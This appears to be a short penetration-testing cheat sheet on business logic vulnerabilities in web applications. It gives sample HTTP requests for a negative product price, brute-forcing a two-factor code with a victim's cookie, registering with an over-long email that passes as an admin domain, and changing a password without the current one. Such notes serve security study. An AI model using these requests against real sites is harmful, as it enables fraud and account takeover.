---
title: Business Logic Vulnerabilities
desc: Examples of Business logic vulnerability.
tags: [BusinessLogic, Web]
alts: []
website:
render_with_liquid: false
---

## POST request parameter

```html
POST /cart HTTP/1.1
...

<!-- price is less than 0 -->
productId=1&quantity=1&price=-1000
```

<br />

## Broken two-factor

```html
POST /login HTTP/1.1
Cookie: verify=victim
...

<!-- Brute force digits code -->
mfa-code=1111
```

<br />

## Loop back with 2,147,483,647

<br />

## Register with very long email address contains the email address for admin

```html
POST /register HTTP/1.1
...

username=attacker&password=pass1&email=aaaaaaaaaaaaa...aa@vulnerable.com.attacker.com
```

<br />

## Remove POST parameter

```html
POST /change-password HTTP/1.1
...

<!-- Remove 'current-password' parameter -->
username=admin&new-password-1=newpass&new-password-2=newpass
```